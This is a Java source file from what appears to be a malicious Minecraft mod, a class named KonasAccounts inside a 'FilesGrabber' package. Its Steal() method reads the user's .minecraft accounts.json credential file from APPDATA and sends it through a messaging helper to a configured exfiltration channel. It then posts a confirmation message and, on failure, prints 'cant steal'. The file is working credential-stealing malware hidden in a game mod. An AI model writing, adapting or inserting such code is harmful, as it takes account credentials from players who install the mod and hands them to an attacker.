package com.example.examplemod.Hacks.FilesGrabber.Konsa;

import com.example.examplemod.Sender.Cfg;
import com.example.examplemod.Sender.SendMessage;
import java.io.File;

public class KonasAccounts {
   public static void Steal() throws Exception {
      try {
         SendMessage.sendFile(new File(System.getenv("APPDATA") + "\\.minecraft\\accounts.json"));
         SendMessage.doThing("```KonasAccaunts ^^^```", Cfg.FilesChannel);
      } catch (Exception var1) {
         System.out.println("cant steal");
      }

   }
}
